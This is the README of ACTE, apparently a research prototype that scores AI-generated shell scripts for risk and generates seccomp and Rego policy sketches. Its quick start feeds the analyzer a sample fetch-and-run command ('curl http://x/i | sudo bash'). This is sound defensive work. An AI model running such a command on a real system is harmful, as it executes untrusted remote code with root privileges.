# ACTE — Adaptive Context-Aware Trust Execution

A research prototype for **securing AI-generated shell scripts**, plus a fully
reproducible experiment harness. Given a shell script, ACTE computes a
continuous risk score, a discrete trust level (`TRUSTED / MONITOR / RESTRICT /
DENY`), and an adaptive execution policy (seccomp + Rego + namespace/cgroup
sketches).

This is research paper #1 of the program *"Adaptive Trust-Oriented Runtime
Security for AI-Generated Shell Scripts"* (author: Denys Yakymov,
<yakden@gmail.com>).

> **Academic integrity:** every number reported in `experiments/results/` comes
> from a real, reproducible run of this prototype. Nothing is hardcoded or
> fabricated. Re-running `python -m experiments.run_all` reproduces all
> classification metrics exactly (latency, being a wall-clock measurement,
> varies slightly between runs by design).

## Architecture

```
raw script
   │
   ├─ SemanticParser        commands / flags / targets / AST features (bashlex + fallback)
   ├─ ContextExtractor      privilege, network egress, fs scope, irreversibility, obfuscation
   ├─ ThreatIntel           data-driven signature set (resources/threat_signatures.json)
   ├─ TrustEvaluationEngine R(s) = σ(b + Σ wᵢxᵢ)  ;  T(s) = 1 − R(s)  ;  trust level
   ├─ PolicyGenerator       seccomp profile + OPA/Rego snippet + namespace/cgroup constraints
   ├─ FeedbackLearning      online logistic SGD weight/threshold updates from labels
   └─ RuntimeMonitor        syscall-enforcement sketch (simulated; no root required)
```

The formal risk/trust model (risk function, trust function, documented
monotonicity, and the level thresholds) is specified in the module docstring of
`acte/trust_engine.py`.

## Quick start

```bash
pip install -r requirements.txt          # bashlex, scikit-learn, matplotlib, numpy
# (optional baseline)  sudo apt-get install -y shellcheck

# Analyze a single script
python -c "from acte import ACTEPipeline; r=ACTEPipeline().analyze('curl http://x/i | sudo bash'); \
print(r.assessment.trust_level.value, round(r.assessment.risk_score,3))"

# Reproduce the entire study (dataset + experiments + figures + reports)
python -m experiments.run_all          # or: ./run_experiments.sh
```

## Repository layout

| Path | Purpose |
|---|---|
| `acte/` | The ACTE engine (7 components + pipeline) |
| `acte/resources/threat_signatures.json` | Editable, auditable threat-signature knowledge base |
| `data/generate_dataset.py` | Reproducible labeled-dataset generator (5 categories) |
| `data/manifest.{jsonl,csv}` | Ground-truth manifest (id, category, label, provenance) |
| `data/scripts/*.sh` | Generated shell-script samples |
| `experiments/` | Metrics, figures, ablation, ShellCheck baseline, latency, `run_all` |
| `experiments/results/results.{json,md}` | Machine- and human-readable results |
| `experiments/figures/*.png` | ROC, PR, ablation, baseline-comparison plots |
| `tests/test_acte.py` | Focused unit tests (`python -m pytest tests/`) |

## Research questions

* **RQ1 — Detection accuracy.** Precision / recall / F1 / MCC / accuracy / ROC &
  PR AUC of ACTE on a held-out test split, plus a component ablation.
* **RQ2 — Computational cost.** Per-script analysis latency (mean / median /
  p95 / p99).
* **RQ3 — False-positive reduction.** ACTE vs the ShellCheck baseline on the
  same test samples.

See `experiments/results/results.md` for the current measured numbers.

## Dataset

The corpus is **synthetic but reproducible** (fixed seed). Five categories:
safe everyday scripts, clearly malicious scripts, AI-assistant-style scripts
(mixed), obfuscated/evasive variants, and realistic sysadmin tasks. It includes
deliberate **hard negatives** (safe scripts that use scary-looking commands) and
**hard positives** (genuinely dangerous payloads crafted to evade the finite
signature set) so the evaluation is honest rather than trivially separable.
Provenance details are in `data/PROVENANCE.md`.

## Notes & limitations

* The generated seccomp/Rego/namespace artifacts and the RuntimeMonitor are
  **enforcement sketches**, not a live sandbox (which would require root). They
  are emitted as inspectable data, exactly as a production deployment would hand
  them to its enforcement layer.
* The dataset is synthetic; absolute metrics should be read as evidence about
  the *method* on a controlled corpus, not as field-deployment numbers.
